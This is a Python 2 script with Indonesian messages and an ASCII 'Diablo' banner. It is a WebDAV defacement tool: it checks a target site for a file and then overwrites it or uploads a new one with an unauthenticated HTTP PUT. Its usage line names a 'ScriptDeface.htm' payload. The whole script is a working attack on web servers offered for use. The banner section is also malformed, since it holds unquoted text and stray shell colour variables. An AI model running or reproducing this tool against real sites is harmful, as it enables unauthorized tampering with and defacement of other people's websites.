import requests
import string
import random
import sys
import os

os.system("clear")

print ""
                                                 ^${BBlue}:
                                                ^!${BBlue}^.
                  :.                 .         ^~!${BBlue}~:.                           .
               .::^.                .^.        :~~${BBlue}^^.        :.                 .:..:
           ....:^^:                .^^:  :.    :~!${BBlue}~^:   ..  .:^.                 .::::...
        .:...^^.             .    .^::::^.    ^~7${BBlue}!~:   .::.:.^:                   ......:.
      .....::^^           . .!!^^!^:::::::^:...^!?${BBlue}7~:. .:::::.::.:::^!~.             .:...:..
      ....:.::            .^^~:!!~~77^::^::^:::~!7${BBlue}7~~::^^:^:.:.:^!!!^:^:.             ......::
    .. ....:^           .:^^~~!!^::~!!~~^::^^^:~!7${BBlue}!^^:^^::::~!~!^:^^!!!!^.:.           :. .:.::
   ..  .. .:^         ........:?^.:~^~7??7!~^^^^~!${BBlue}~^^^~^!7777^!~::^?7::::...:.         ..  .....
    .     .::    ....:^~~^^^:. ::::~^:~!7?JJ7~~^^~${BBlue}^^^^~7YYJ7^:^~^.:!. .:^~~~~~^:.      ::  ....:
   ..       .^..::^^:::.:^^..   .:::^:^~~~~7Y?~^~!${BBlue}!~!7YJ!~^^^:^~::::   ..^!~::::::::. .:    ....
    .        ..:..:~::.          ::::^^~~7YJ?5JJ~7${BBlue}~~YYYJ5J~~~~~::::       .  :^~!^::^..       ..
     .  .          .            .::^~!7!7?P57!7~!J${BBlue}7~!!~?Y?7!~!~~^.:      .     .. ...         .
     .                          ^:^~!7777!!!!!7?J5${BBlue}YY7!!7!!77!77!^...     .                   .
      ..                        ^:.:^!7?J7~^77!!?P${BBlue}Y7~7?!~!?JJ~:....:    .                   .
        .... .                  .  ....:^.:~?Y7777${BBlue}?J??J7~:.^:...   :. .. .            .....
             .  . ..   .   .          :::.:^!7?77?${BBlue}J?777~^^....               .  .   . .
                                      ^::.:~~!^~~?${BBlue}7~^~~^.:...:
                                     .::^:.~!G?5YY${BBlue}5YYP7^..::^^.
                                   :::^::::~^7!J?J${BBlue}J77?!~::::^:^:.
                                   .:!7^..:!??77??${BBlue}?7?!J7::.::7?!:
                                   ^^7J!:.:.~!!!7?${BBlue}77!!7^.:::~!7~~7.
                                  !B5^:::...:::~!7${BBlue}7!~^:....::::^PGY.
                                :YP?: .  :.::^::^${BBlue}^:::::.:.. ...~5B7
                                 ~!.       :::~^!7${BBlue}?!^^^:..        ^!.
                                .           ::::~J${BBlue}J?~::::
                                               ~5P${BBlue}#P?.
                                                7Y${BBlue}PY^
                                                .~${BBlue}7~
                                                 .${BBlue}:.
                                                  ${BBlue}.
                       ██████████    ███            █████     ████
                      ░░███░░░░███  ░░░            ░░███     ░░███
                       ░███   ░░███ ████   ██████   ░███████  ░███   ██████
                       ░███    ░███░░███  ░░░░░███  ░███░░███ ░███  ███░░███
                       ░███    ░███ ░███   ███████  ░███ ░███ ░███ ░███ ░███
                       ░███    ███  ░███  ███░░███  ░███ ░███ ░███ ░███ ░███
                       ██████████   █████░░████████ ████████  █████░░██████
                      ░░░░░░░░░░   ░░░░░  ░░░░░░░░ ░░░░░░░░  ░░░░░  ░░░░░░
                                         
                                          ""

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Nama : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload failed . . .")
    sys.exit(1)
  else:
    print("[+] File uploaded . . .")
    print("[+] PATH : "+host + nama)


def cekfile():

 print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] File Ga Di Target . . .")
   print("[*] Proses Upload Script lu . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()
